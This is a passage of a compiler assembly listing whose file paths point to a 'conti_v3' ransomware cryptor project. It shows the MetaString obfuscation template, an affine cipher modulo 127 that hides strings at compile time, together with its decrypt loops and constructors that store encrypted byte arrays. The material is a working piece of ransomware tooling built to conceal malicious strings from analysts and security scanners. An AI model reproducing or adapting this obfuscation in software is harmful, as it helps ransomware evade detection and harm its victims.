; 67   :         }
; 68   : 
; 69   :         return (const char*)m_buffer;
; 70   :     }

  00071	49 8b c0	 mov	 rax, r8
  00074	c3		 ret	 0
?decrypt@?$MetaBuffer@$06$0BK@U?$integer_sequence@_K$0A@$00$01$02$03@std@@@@QEAAPEBDXZ ENDP ; MetaBuffer<7,26,std::integer_sequence<unsigned __int64,0,1,2,3,4> >::decrypt
_TEXT	ENDS
; Function compile flags: /Ogtpy
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\obfuscation\MetaString.h
;	COMDAT ??0?$MetaBuffer@$06$0BK@U?$integer_sequence@_K$0A@$00$01$02$03@std@@@@QEAA@PEBE@Z
_TEXT	SEGMENT
this$ = 8
data$dead$ = 16
??0?$MetaBuffer@$06$0BK@U?$integer_sequence@_K$0A@$00$01$02$03@std@@@@QEAA@PEBE@Z PROC ; MetaBuffer<7,26,std::integer_sequence<unsigned __int64,0,1,2,3,4> >::MetaBuffer<7,26,std::integer_sequence<unsigned __int64,0,1,2,3,4> >, COMDAT

; 55   : 
; 56   :     inline bool isDecrypted() const
; 57   :     {
; 58   :         return m_isDecrypted;
; 59   :     }
; 60   : 
; 61   :     inline const char* decrypt()
; 62   :     {
; 63   :         if (!isDecrypted())
; 64   :         {
; 65   :             for (size_t i = 0; i < sizeof...(Ints); ++i)
; 66   :                 m_buffer[i] = decrypt(m_buffer[i]);
; 67   :         }
; 68   : 
; 69   :         return (const char*)m_buffer;
; 70   :     }
; 71   : 
; 72   : private:
; 73   :     constexpr unsigned char __forceinline encrypt(unsigned char byte) const
; 74   :     {
; 75   :         return (A * byte + B) % 127;
; 76   :     }
; 77   : 
; 78   :     constexpr unsigned char __forceinline decrypt(unsigned char byte) const
; 79   :     {
; 80   :         return positive_modulo(ExtendedEuclidian<127, A>::y * (byte - B), 127);
; 81   :     }
; 82   : 
; 83   :     volatile bool m_isDecrypted = false;

  00000	c6 01 00	 mov	 BYTE PTR [rcx], 0
  00003	c6 41 01 73	 mov	 BYTE PTR [rcx+1], 115	; 00000073H
  00007	c6 41 02 1e	 mov	 BYTE PTR [rcx+2], 30
  0000b	c6 41 03 7a	 mov	 BYTE PTR [rcx+3], 122	; 0000007aH
  0000f	c6 41 04 5e	 mov	 BYTE PTR [rcx+4], 94	; 0000005eH
  00013	c6 41 05 1a	 mov	 BYTE PTR [rcx+5], 26
  00017	0f b6 41 01	 movzx	 eax, BYTE PTR [rcx+1]
  0001b	48 8b c1	 mov	 rax, rcx
  0001e	c3		 ret	 0
??0?$MetaBuffer@$06$0BK@U?$integer_sequence@_K$0A@$00$01$02$03@std@@@@QEAA@PEBE@Z ENDP ; MetaBuffer<7,26,std::integer_sequence<unsigned __int64,0,1,2,3,4> >::MetaBuffer<7,26,std::integer_sequence<unsigned __int64,0,1,2,3,4> >
_TEXT	ENDS
; Function compile flags: /Ogtpy
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\obfuscation\MetaString.h
;	COMDAT ?decrypt@?$MetaBuffer@$04$0GF@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@$0O@$0P@$0BA@$0BB@$0BC@$0BD@$0BE@$0BF@$0BG@$0BH@$0BI@$0BJ@$0BK@$0BL@$0BM@$0BN@$0BO@$0BP@$0CA@$0CB@$0CC@$0CD@$0CE@$0CF@$0CG@$0CH@$0CI@$0CJ@$0CK@$0CL@$0CM@$0CN@$0CO@$0CP@$0DA@$0DB@$0DC@$0DD@$0DE@$0DF@$0DG@$0DH@$0DI@$0DJ@$0DK@$0DL@$0DM@$0DN@$0DO@$0DP@$0EA@$0EB@$0EC@$0ED@$0EE@$0EF@$0EG@$0EH@$0EI@$0EJ@$0EK@$0EL@$0EM@$0EN@$0EO@$0EP@@std@@@@QEAAPEBDXZ
_TEXT	SEGMENT
this$ = 8
?decrypt@?$MetaBuffer@$04$0GF@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@$0O@$0P@$0BA@$0BB@$0BC@$0BD@$0BE@$0BF@$0BG@$0BH@$0BI@$0BJ@$0BK@$0BL@$0BM@$0BN@$0BO@$0BP@$0CA@$0CB@$0CC@$0CD@$0CE@$0CF@$0CG@$0CH@$0CI@$0CJ@$0CK@$0CL@$0CM@$0CN@$0CO@$0CP@$0DA@$0DB@$0DC@$0DD@$0DE@$0DF@$0DG@$0DH@$0DI@$0DJ@$0DK@$0DL@$0DM@$0DN@$0DO@$0DP@$0EA@$0EB@$0EC@$0ED@$0EE@$0EF@$0EG@$0EH@$0EI@$0EJ@$0EK@$0EL@$0EM@$0EN@$0EO@$0EP@@std@@@@QEAAPEBDXZ PROC ; MetaBuffer<5,101,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30,31,32,33,34,35,36,37,38,39,40,41,42,43,44,45,46,47,48,49,50,51,52,53,54,55,56,57,58,59,60,61,62,63,64,65,66,67,68,69,70,71,72,73,74,75,76,77,78,79> >::decrypt, COMDAT

; 58   :         return m_isDecrypted;

  00000	0f b6 01	 movzx	 eax, BYTE PTR [rcx]
  00003	4c 8d 49 01	 lea	 r9, QWORD PTR [rcx+1]

; 63   :         if (!isDecrypted())

  00007	84 c0		 test	 al, al
  00009	75 68		 jne	 SHORT $LN17@decrypt

; 64   :         {
; 65   :             for (size_t i = 0; i < sizeof...(Ints); ++i)

  0000b	4d 8b d1	 mov	 r10, r9
  0000e	41 bb 50 00 00
	00		 mov	 r11d, 80		; 00000050H
  00014	0f 1f 40 00 0f
	1f 84 00 00 00
	00 00		 npad	 12
$LL4@decrypt:

; 66   :                 m_buffer[i] = decrypt(m_buffer[i]);

  00020	41 0f b6 0a	 movzx	 ecx, BYTE PTR [r10]
  00024	4d 8d 52 01	 lea	 r10, QWORD PTR [r10+1]

; 80   :         return positive_modulo(ExtendedEuclidian<127, A>::y * (byte - B), 127);

  00028	83 e9 65	 sub	 ecx, 101		; 00000065H

; 40   :     return (a % n + n) % n;

  0002b	b8 09 04 02 81	 mov	 eax, -2130574327	; ffffffff81020409H

; 80   :         return positive_modulo(ExtendedEuclidian<127, A>::y * (byte - B), 127);

  00030	44 6b c1 33	 imul	 r8d, ecx, 51		; 00000033H

; 40   :     return (a % n + n) % n;

  00034	41 f7 e8	 imul	 r8d
  00037	41 03 d0	 add	 edx, r8d
  0003a	c1 fa 06	 sar	 edx, 6
  0003d	8b c2		 mov	 eax, edx
  0003f	c1 e8 1f	 shr	 eax, 31
  00042	03 d0		 add	 edx, eax
  00044	6b c2 7f	 imul	 eax, edx, 127		; 0000007fH
  00047	44 2b c0	 sub	 r8d, eax
  0004a	b8 09 04 02 81	 mov	 eax, -2130574327	; ffffffff81020409H
  0004f	41 83 c0 7f	 add	 r8d, 127		; 0000007fH
  00053	41 f7 e8	 imul	 r8d
  00056	41 03 d0	 add	 edx, r8d
  00059	c1 fa 06	 sar	 edx, 6
  0005c	8b c2		 mov	 eax, edx
  0005e	c1 e8 1f	 shr	 eax, 31
  00061	03 d0		 add	 edx, eax
  00063	6b c2 7f	 imul	 eax, edx, 127		; 0000007fH
  00066	44 2b c0	 sub	 r8d, eax

; 66   :                 m_buffer[i] = decrypt(m_buffer[i]);

  00069	45 88 42 ff	 mov	 BYTE PTR [r10-1], r8b
  0006d	49 83 eb 01	 sub	 r11, 1
  00071	75 ad		 jne	 SHORT $LL4@decrypt
$LN17@decrypt:

; 67   :         }
; 68   : 
; 69   :         return (const char*)m_buffer;
; 70   :     }

  00073	49 8b c1	 mov	 rax, r9
  00076	c3		 ret	 0
?decrypt@?$MetaBuffer@$04$0GF@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@$0O@$0P@$0BA@$0BB@$0BC@$0BD@$0BE@$0BF@$0BG@$0BH@$0BI@$0BJ@$0BK@$0BL@$0BM@$0BN@$0BO@$0BP@$0CA@$0CB@$0CC@$0CD@$0CE@$0CF@$0CG@$0CH@$0CI@$0CJ@$0CK@$0CL@$0CM@$0CN@$0CO@$0CP@$0DA@$0DB@$0DC@$0DD@$0DE@$0DF@$0DG@$0DH@$0DI@$0DJ@$0DK@$0DL@$0DM@$0DN@$0DO@$0DP@$0EA@$0EB@$0EC@$0ED@$0EE@$0EF@$0EG@$0EH@$0EI@$0EJ@$0EK@$0EL@$0EM@$0EN@$0EO@$0EP@@std@@@@QEAAPEBDXZ ENDP ; MetaBuffer<5,101,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30,31,32,33,34,35,36,37,38,39,40,41,42,43,44,45,46,47,48,49,50,51,52,53,54,55,56,57,58,59,60,61,62,63,64,65,66,67,68,69,70,71,72,73,74,75,76,77,78,79> >::decrypt
_TEXT	ENDS
; Function compile flags: /Ogtpy
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\obfuscation\MetaString.h
;	COMDAT ??0?$MetaBuffer@$04$0GF@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@$0O@$0P@$0BA@$0BB@$0BC@$0BD@$0BE@$0BF@$0BG@$0BH@$0BI@$0BJ@$0BK@$0BL@$0BM@$0BN@$0BO@$0BP@$0CA@$0CB@$0CC@$0CD@$0CE@$0CF@$0CG@$0CH@$0CI@$0CJ@$0CK@$0CL@$0CM@$0CN@$0CO@$0CP@$0DA@$0DB@$0DC@$0DD@$0DE@$0DF@$0DG@$0DH@$0DI@$0DJ@$0DK@$0DL@$0DM@$0DN@$0DO@$0DP@$0EA@$0EB@$0EC@$0ED@$0EE@$0EF@$0EG@$0EH@$0EI@$0EJ@$0EK@$0EL@$0EM@$0EN@$0EO@$0EP@@std@@@@QEAA@PEBE@Z
_TEXT	SEGMENT
this$ = 8
data$dead$ = 16
??0?$MetaBuffer@$04$0GF@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@$0O@$0P@$0BA@$0BB@$0BC@$0BD@$0BE@$0BF@$0BG@$0BH@$0BI@$0BJ@$0BK@$0BL@$0BM@$0BN@$0BO@$0BP@$0CA@$0CB@$0CC@$0CD@$0CE@$0CF@$0CG@$0CH@$0CI@$0CJ@$0CK@$0CL@$0CM@$0CN@$0CO@$0CP@$0DA@$0DB@$0DC@$0DD@$0DE@$0DF@$0DG@$0DH@$0DI@$0DJ@$0DK@$0DL@$0DM@$0DN@$0DO@$0DP@$0EA@$0EB@$0EC@$0ED@$0EE@$0EF@$0EG@$0EH@$0EI@$0EJ@$0EK@$0EL@$0EM@$0EN@$0EO@$0EP@@std@@@@QEAA@PEBE@Z PROC ; MetaBuffer<5,101,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30,31,32,33,34,35,36,37,38,39,40,41,42,43,44,45,46,47,48,49,50,51,52,53,54,55,56,57,58,59,60,61,62,63,64,65,66,67,68,69,70,71,72,73,74,75,76,77,78,79> >::MetaBuffer<5,101,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30,31,32,33,34,35,36,37,38,39,40,41,42,43,44,45,46,47,48,49,50,51,52,53,54,55,56,57,58,59,60,61,62,63,64,65,66,67,68,69,70,71,72,73,74,75,76,77,78,79> >, COMDAT

; 55   : 
; 56   :     inline bool isDecrypted() const
; 57   :     {
; 58   :         return m_isDecrypted;
; 59   :     }
; 60   : 
; 61   :     inline const char* decrypt()
; 62   :     {
; 63   :         if (!isDecrypted())
; 64   :         {
; 65   :             for (size_t i = 0; i < sizeof...(Ints); ++i)
; 66   :                 m_buffer[i] = decrypt(m_buffer[i]);
; 67   :         }
; 68   : 
; 69   :         return (const char*)m_buffer;
; 70   :     }
; 71   : 
; 72   : private:
; 73   :     constexpr unsigned char __forceinline encrypt(unsigned char byte) const
; 74   :     {
; 75   :         return (A * byte + B) % 127;
; 76   :     }
; 77   : 
; 78   :     constexpr unsigned char __forceinline decrypt(unsigned char byte) const
; 79   :     {
; 80   :         return positive_modulo(ExtendedEuclidian<127, A>::y * (byte - B), 127);
; 81   :     }
; 82   : 
; 83   :     volatile bool m_isDecrypted = false;

  00000	c6 01 00	 mov	 BYTE PTR [rcx], 0
  00003	c6 41 01 4b	 mov	 BYTE PTR [rcx+1], 75	; 0000004bH
  00007	c6 41 02 65	 mov	 BYTE PTR [rcx+2], 101	; 00000065H
  0000b	c6 41 03 62	 mov	 BYTE PTR [rcx+3], 98	; 00000062H
  0000f	c6 41 04 65	 mov	 BYTE PTR [rcx+4], 101	; 00000065H
  00013	c6 41 05 2e	 mov	 BYTE PTR [rcx+5], 46	; 0000002eH
  00017	c6 41 06 65	 mov	 BYTE PTR [rcx+6], 101	; 00000065H
  0001b	c6 41 07 55	 mov	 BYTE PTR [rcx+7], 85	; 00000055H
  0001f	c6 41 08 65	 mov	 BYTE PTR [rcx+8], 101	; 00000065H
  00023	c6 41 09 1a	 mov	 BYTE PTR [rcx+9], 26
  00027	c6 41 0a 65	 mov	 BYTE PTR [rcx+10], 101	; 00000065H
  0002b	c6 41 0b 6e	 mov	 BYTE PTR [rcx+11], 110	; 0000006eH
  0002f	c6 41 0c 65	 mov	 BYTE PTR [rcx+12], 101	; 00000065H
  00033	c6 41 0d 62	 mov	 BYTE PTR [rcx+13], 98	; 00000062H
  00037	c6 41 0e 65	 mov	 BYTE PTR [rcx+14], 101	; 00000065H
  0003b	c6 41 0f 2e	 mov	 BYTE PTR [rcx+15], 46	; 0000002eH
  0003f	c6 41 10 65	 mov	 BYTE PTR [rcx+16], 101	; 00000065H
  00043	c6 41 11 0d	 mov	 BYTE PTR [rcx+17], 13
  00047	c6 41 12 65	 mov	 BYTE PTR [rcx+18], 101	; 00000065H
  0004b	c6 41 13 4e	 mov	 BYTE PTR [rcx+19], 78	; 0000004eH
  0004f	c6 41 14 65	 mov	 BYTE PTR [rcx+20], 101	; 00000065H
  00053	c6 41 15 53	 mov	 BYTE PTR [rcx+21], 83	; 00000053H
  00057	c6 41 16 65	 mov	 BYTE PTR [rcx+22], 101	; 00000065H
  0005b	c6 41 17 06	 mov	 BYTE PTR [rcx+23], 6
  0005f	c6 41 18 65	 mov	 BYTE PTR [rcx+24], 101	; 00000065H
  00063	c6 41 19 62	 mov	 BYTE PTR [rcx+25], 98	; 00000062H
  00067	c6 41 1a 65	 mov	 BYTE PTR [rcx+26], 101	; 00000065H
  0006b	c6 41 1b 07	 mov	 BYTE PTR [rcx+27], 7
  0006f	c6 41 1c 65	 mov	 BYTE PTR [rcx+28], 101	; 00000065H
  00073	c6 41 1d 67	 mov	 BYTE PTR [rcx+29], 103	; 00000067H
  00077	c6 41 1e 65	 mov	 BYTE PTR [rcx+30], 101	; 00000065H
  0007b	c6 41 1f 4e	 mov	 BYTE PTR [rcx+31], 78	; 0000004eH
  0007f	c6 41 20 65	 mov	 BYTE PTR [rcx+32], 101	; 00000065H
  00083	c6 41 21 76	 mov	 BYTE PTR [rcx+33], 118	; 00000076H
  00087	c6 41 22 65	 mov	 BYTE PTR [rcx+34], 101	; 00000065H
  0008b	c6 41 23 06	 mov	 BYTE PTR [rcx+35], 6
  0008f	c6 41 24 65	 mov	 BYTE PTR [rcx+36], 101	; 00000065H
  00093	c6 41 25 29	 mov	 BYTE PTR [rcx+37], 41	; 00000029H
  00097	c6 41 26 65	 mov	 BYTE PTR [rcx+38], 101	; 00000065H
  0009b	c6 41 27 4d	 mov	 BYTE PTR [rcx+39], 77	; 0000004dH
  0009f	c6 41 28 65	 mov	 BYTE PTR [rcx+40], 101	; 00000065H
  000a3	c6 41 29 07	 mov	 BYTE PTR [rcx+41], 7
  000a7	c6 41 2a 65	 mov	 BYTE PTR [rcx+42], 101	; 00000065H
  000ab	c6 41 2b 4b	 mov	 BYTE PTR [rcx+43], 75	; 0000004bH
  000af	c6 41 2c 65	 mov	 BYTE PTR [rcx+44], 101	; 00000065H
  000b3	c6 41 2d 62	 mov	 BYTE PTR [rcx+45], 98	; 00000062H
  000b7	c6 41 2e 65	 mov	 BYTE PTR [rcx+46], 101	; 00000065H
  000bb	c6 41 2f 2e	 mov	 BYTE PTR [rcx+47], 46	; 0000002eH
  000bf	c6 41 30 65	 mov	 BYTE PTR [rcx+48], 101	; 00000065H
  000c3	c6 41 31 64	 mov	 BYTE PTR [rcx+49], 100	; 00000064H
  000c7	c6 41 32 65	 mov	 BYTE PTR [rcx+50], 101	; 00000065H
  000cb	c6 41 33 4e	 mov	 BYTE PTR [rcx+51], 78	; 0000004eH
  000cf	c6 41 34 65	 mov	 BYTE PTR [rcx+52], 101	; 00000065H
  000d3	c6 41 35 29	 mov	 BYTE PTR [rcx+53], 41	; 00000029H
  000d7	c6 41 36 65	 mov	 BYTE PTR [rcx+54], 101	; 00000065H
  000db	c6 41 37 2e	 mov	 BYTE PTR [rcx+55], 46	; 0000002eH
  000df	c6 41 38 65	 mov	 BYTE PTR [rcx+56], 101	; 00000065H
  000e3	c6 41 39 41	 mov	 BYTE PTR [rcx+57], 65	; 00000041H
  000e7	c6 41 3a 65	 mov	 BYTE PTR [rcx+58], 101	; 00000065H
  000eb	c6 41 3b 24	 mov	 BYTE PTR [rcx+59], 36	; 00000024H
  000ef	c6 41 3c 65	 mov	 BYTE PTR [rcx+60], 101	; 00000065H
  000f3	c6 41 3d 24	 mov	 BYTE PTR [rcx+61], 36	; 00000024H
  000f7	c6 41 3e 65	 mov	 BYTE PTR [rcx+62], 101	; 00000065H
  000fb	c6 41 3f 15	 mov	 BYTE PTR [rcx+63], 21
  000ff	c6 41 40 65	 mov	 BYTE PTR [rcx+64], 101	; 00000065H
  00103	c6 41 41 24	 mov	 BYTE PTR [rcx+65], 36	; 00000024H
  00107	c6 41 42 65	 mov	 BYTE PTR [rcx+66], 101	; 00000065H
  0010b	c6 41 43 07	 mov	 BYTE PTR [rcx+67], 7
  0010f	c6 41 44 65	 mov	 BYTE PTR [rcx+68], 101	; 00000065H
  00113	c6 41 45 19	 mov	 BYTE PTR [rcx+69], 25
  00117	c6 41 46 65	 mov	 BYTE PTR [rcx+70], 101	; 00000065H
  0011b	c6 41 47 07	 mov	 BYTE PTR [rcx+71], 7
  0011f	c6 41 48 65	 mov	 BYTE PTR [rcx+72], 101	; 00000065H
  00123	c6 41 49 20	 mov	 BYTE PTR [rcx+73], 32	; 00000020H
  00127	c6 41 4a 65	 mov	 BYTE PTR [rcx+74], 101	; 00000065H
  0012b	c6 41 4b 06	 mov	 BYTE PTR [rcx+75], 6
  0012f	c6 41 4c 65	 mov	 BYTE PTR [rcx+76], 101	; 00000065H
  00133	c6 41 4d 33	 mov	 BYTE PTR [rcx+77], 51	; 00000033H
  00137	c6 41 4e 65	 mov	 BYTE PTR [rcx+78], 101	; 00000065H
  0013b	c6 41 4f 65	 mov	 BYTE PTR [rcx+79], 101	; 00000065H
  0013f	c6 41 50 65	 mov	 BYTE PTR [rcx+80], 101	; 00000065H

; 51   :         : m_buffer{ encrypt(data[Ints])... }
; 52   :     {
; 53   : 
; 54   :     }

  00143	0f b6 41 01	 movzx	 eax, BYTE PTR [rcx+1]
  00147	48 8b c1	 mov	 rax, rcx
  0014a	c3		 ret	 0
??0?$MetaBuffer@$04$0GF@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@$0O@$0P@$0BA@$0BB@$0BC@$0BD@$0BE@$0BF@$0BG@$0BH@$0BI@$0BJ@$0BK@$0BL@$0BM@$0BN@$0BO@$0BP@$0CA@$0CB@$0CC@$0CD@$0CE@$0CF@$0CG@$0CH@$0CI@$0CJ@$0CK@$0CL@$0CM@$0CN@$0CO@$0CP@$0DA@$0DB@$0DC@$0DD@$0DE@$0DF@$0DG@$0DH@$0DI@$0DJ@$0DK@$0DL@$0DM@$0DN@$0DO@$0DP@$0EA@$0EB@$0EC@$0ED@$0EE@$0EF@$0EG@$0EH@$0EI@$0EJ@$0EK@$0EL@$0EM@$0EN@$0EO@$0EP@@std@@@@QEAA@PEBE@Z ENDP ; MetaBuffer<5,101,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30,31,32,33,34,35,36,37,38,39,40,41,42,43,44,45,46,47,48,49,50,51,52,53,54,55,56,57,58,59,60,61,62,63,64,65,66,67,68,69,70,71,72,73,74,75,76,77,78,79> >::MetaBuffer<5,101,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30,31,32,33,34,35,36,37,38,39,40,41,42,43,44,45,46,47,48,49,50,51,52,53,54,55,56,57,58,59,60,61,62,63,64,65,66,67,68,69,70,71,72,73,74,75,76,77,78,79> >
_TEXT	ENDS
; Function compile flags: /Ogtpy
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\obfuscation\MetaString.h
;	COMDAT ?decrypt@?$MetaBuffer@$0DN@$0CE@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@$0O@$0P@$0BA@$0BB@$0BC@$0BD@$0BE@$0BF@$0BG@$0BH@$0BI@$0BJ@$0BK@$0BL@$0BM@$0BN@$0BO@$0BP@$0CA@$0CB@$0CC@$0CD@$0CE@$0CF@$0CG@$0CH@$0CI@$0CJ@$0CK@$0CL@$0CM@$0CN@$0CO@$0CP@$0DA@$0DB@$0DC@$0DD@$0DE@$0DF@$0DG@$0DH@$0DI@$0DJ@$0DK@$0DL@$0DM@$0DN@$0DO@$0DP@$0EA@$0EB@$0EC@$0ED@$0EE@$0EF@$0EG@$0EH@$0EI@$0EJ@$0EK@$0EL@$0EM@$0EN@$0EO@$0EP@@std@@@@QEAAPEBDXZ
_TEXT	SEGMENT
this$ = 8
?decrypt@?$MetaBuffer@$0DN@$0CE@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@$0O@$0P@$0BA@$0BB@$0BC@$0BD@$0BE@$0BF@$0BG@$0BH@$0BI@$0BJ@$0BK@$0BL@$0BM@$0BN@$0BO@$0BP@$0CA@$0CB@$0CC@$0CD@$0CE@$0CF@$0CG@$0CH@$0CI@$0CJ@$0CK@$0CL@$0CM@$0CN@$0CO@$0CP@$0DA@$0DB@$0DC@$0DD@$0DE@$0DF@$0DG@$0DH@$0DI@$0DJ@$0DK@$0DL@$0DM@$0DN@$0DO@$0DP@$0EA@$0EB@$0EC@$0ED@$0EE@$0EF@$0EG@$0EH@$0EI@$0EJ@$0EK@$0EL@$0EM@$0EN@$0EO@$0EP@@std@@@@QEAAPEBDXZ PROC ; MetaBuffer<61,36,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30,31,32,33,34,35,36,37,38,39,40,41,42,43,44,45,46,47,48,49,50,51,52,53,54,55,56,57,58,59,60,61,62,63,64,65,66,67,68,69,70,71,72,73,74,75,76,77,78,79> >::decrypt, COMDAT

; 58   :         return m_isDecrypted;

  00000	0f b6 01	 movzx	 eax, BYTE PTR [rcx]
  00003	4c 8d 49 01	 lea	 r9, QWORD PTR [rcx+1]

; 63   :         if (!isDecrypted())

  00007	84 c0		 test	 al, al
  00009	75 68		 jne	 SHORT $LN17@decrypt

; 64   :         {
; 65   :             for (size_t i = 0; i < sizeof...(Ints); ++i)

  0000b	4d 8b d1	 mov	 r10, r9
  0000e	41 bb 50 00 00
	00		 mov	 r11d, 80		; 00000050H
  00014	0f 1f 40 00 0f
	1f 84 00 00 00
	00 00		 npad	 12
$LL4@decrypt:

; 66   :                 m_buffer[i] = decrypt(m_buffer[i]);

  00020	41 0f b6 0a	 movzx	 ecx, BYTE PTR [r10]
  00024	4d 8d 52 01	 lea	 r10, QWORD PTR [r10+1]

; 80   :         return positive_modulo(ExtendedEuclidian<127, A>::y * (byte - B), 127);

  00028	83 e9 24	 sub	 ecx, 36			; 00000024H

; 40   :     return (a % n + n) % n;

  0002b	b8 09 04 02 81	 mov	 eax, -2130574327	; ffffffff81020409H

; 80   :         return positive_modulo(ExtendedEuclidian<127, A>::y * (byte - B), 127);

  00030	44 6b c1 19	 imul	 r8d, ecx, 25

; 40   :     return (a % n + n) % n;

  00034	41 f7 e8	 imul	 r8d
  00037	41 03 d0	 add	 edx, r8d
  0003a	c1 fa 06	 sar	 edx, 6
  0003d	8b c2		 mov	 eax, edx
  0003f	c1 e8 1f	 shr	 eax, 31
  00042	03 d0		 add	 edx, eax
  00044	6b c2 7f	 imul	 eax, edx, 127		; 0000007fH
  00047	44 2b c0	 sub	 r8d, eax
  0004a	b8 09 04 02 81	 mov	 eax, -2130574327	; ffffffff81020409H
  0004f	41 83 c0 7f	 add	 r8d, 127		; 0000007fH
  00053	41 f7 e8	 imul	 r8d
  00056	41 03 d0	 add	 edx, r8d
  00059	c1 fa 06	 sar	 edx, 6
  0005c	8b c2		 mov	 eax, edx
  0005e	c1 e8 1f	 shr	 eax, 31
  00061	03 d0		 add	 edx, eax
  00063	6b c2 7f	 imul	 eax, edx, 127		; 0000007fH
  00066	44 2b c0	 sub	 r8d, eax

; 66   :                 m_buffer[i] = decrypt(m_buffer[i]);

  00069	45 88 42 ff	 mov	 BYTE PTR [r10-1], r8b
  0006d	49 83 eb 01	 sub	 r11, 1
  00071	75 ad		 jne	 SHORT $LL4@decrypt
$LN17@decrypt:

; 67   :         }
; 68   : 
; 69   :         return (const char*)m_buffer;
; 70   :     }

  00073	49 8b c1	 mov	 rax, r9
  00076	c3		 ret	 0
?decrypt@?$MetaBuffer@$0DN@$0CE@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@$0O@$0P@$0BA@$0BB@$0BC@$0BD@$0BE@$0BF@$0BG@$0BH@$0BI@$0BJ@$0BK@$0BL@$0BM@$0BN@$0BO@$0BP@$0CA@$0CB@$0CC@$0CD@$0CE@$0CF@$0CG@$0CH@$0CI@$0CJ@$0CK@$0CL@$0CM@$0CN@$0CO@$0CP@$0DA@$0DB@$0DC@$0DD@$0DE@$0DF@$0DG@$0DH@$0DI@$0DJ@$0DK@$0DL@$0DM@$0DN@$0DO@$0DP@$0EA@$0EB@$0EC@$0ED@$0EE@$0EF@$0EG@$0EH@$0EI@$0EJ@$0EK@$0EL@$0EM@$0EN@$0EO@$0EP@@std@@@@QEAAPEBDXZ ENDP ; MetaBuffer<61,36,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30,31,32,33,34,35,36,37,38,39,40,41,42,43,44,45,46,47,48,49,50,51,52,53,54,55,56,57,58,59,60,61,62,63,64,65,66,67,68,69,70,71,72,73,74,75,76,77,78,79> >::decrypt
_TEXT	ENDS
; Function compile flags: /Ogtpy
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\obfuscation\MetaString.h
;	COMDAT ??0?$MetaBuffer@$0DN@$0CE@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@$0O@$0P@$0BA@$0BB@$0BC@$0BD@$0BE@$0BF@$0BG@$0BH@$0BI@$0BJ@$0BK@$0BL@$0BM@$0BN@$0BO@$0BP@$0CA@$0CB@$0CC@$0CD@$0CE@$0CF@$0CG@$0CH@$0CI@$0CJ@$0CK@$0CL@$0CM@$0CN@$0CO@$0CP@$0DA@$0DB@$0DC@$0DD@$0DE@$0DF@$0DG@$0DH@$0DI@$0DJ@$0DK@$0DL@$0DM@$0DN@$0DO@$0DP@$0EA@$0EB@$0EC@$0ED@$0EE@$0EF@$0EG@$0EH@$0EI@$0EJ@$0EK@$0EL@$0EM@$0EN@$0EO@$0EP@@std@@@@QEAA@PEBE@Z
_TEXT	SEGMENT
this$ = 8
data$dead$ = 16
??0?$MetaBuffer@$0DN@$0CE@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@$0O@$0P@$0BA@$0BB@$0BC@$0BD@$0BE@$0BF@$0BG@$0BH@$0BI@$0BJ@$0BK@$0BL@$0BM@$0BN@$0BO@$0BP@$0CA@$0CB@$0CC@$0CD@$0CE@$0CF@$0CG@$0CH@$0CI@$0CJ@$0CK@$0CL@$0CM@$0CN@$0CO@$0CP@$0DA@$0DB@$0DC@$0DD@$0DE@$0DF@$0DG@$0DH@$0DI@$0DJ@$0DK@$0DL@$0DM@$0DN@$0DO@$0DP@$0EA@$0EB@$0EC@$0ED@$0EE@$0EF@$0EG@$0EH@$0EI@$0EJ@$0EK@$0EL@$0EM@$0EN@$0EO@$0EP@@std@@@@QEAA@PEBE@Z PROC ; MetaBuffer<61,36,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30,31,32,33,34,35,36,37,38,39,40,41,42,43,44,45,46,47,48,49,50,51,52,53,54,55,56,57,58,59,60,61,62,63,64,65,66,67,68,69,70,71,72,73,74,75,76,77,78,79> >::MetaBuffer<61,36,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30,31,32,33,34,35,36,37,38,39,40,41,42,43,44,45,46,47,48,49,50,51,52,53,54,55,56,57,58,59,60,61,62,63,64,65,66,67,68,69,70,71,72,73,74,75,76,77,78,79> >, 